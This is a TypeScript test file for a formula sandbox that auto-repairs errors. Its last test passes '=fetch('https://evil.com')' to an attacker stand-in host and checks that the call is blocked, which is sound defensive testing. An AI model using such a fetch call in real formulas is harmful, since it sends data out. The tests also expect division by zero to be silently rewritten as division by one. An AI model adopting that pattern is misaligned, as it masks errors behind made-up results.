import { describe, it, expect } from "vitest";
import { WasmSandbox } from "../WasmSandbox";

describe("WasmSandbox: Self-Healing Formula Sandbox", () => {
  it("evaluates clean standard expressions accurately", () => {
    const res = WasmSandbox.evaluateWithSelfHealing("=A1 * 1.15 + B1", { A1: 1000, B1: 200 });
    expect(res.healed).toBe(false);
    expect(res.value).toBe(1350);
    expect(res.executionTimeMs).toBeLessThan(50);
  });

  it("self-heals division-by-zero exceptions autonomously", () => {
    const res = WasmSandbox.evaluateWithSelfHealing("=A1 / 0", { A1: 500 });
    expect(res.healed).toBe(true);
    expect(res.originalError).toContain("DivisionByZero");
    expect(res.value).toBe(500);
    expect(res.repairedFormula).toBe("=A1 / 1");
  });

  it("self-heals unbalanced parentheses syntax errors", () => {
    const res = WasmSandbox.evaluateWithSelfHealing("=(A1 + 50 * 2", { A1: 100 });
    expect(res.healed).toBe(true);
    expect(res.value).toBe(200);
    expect(res.repairedFormula).toBe("=(A1 + 50 * 2)");
  });

  it("blocks dangerous token leakage", () => {
    const res = WasmSandbox.evaluateWithSelfHealing("=fetch('https://evil.com')", {});
    expect(res.healed).toBe(true);
    expect(res.originalError).toContain("Security Violation");
  });
});
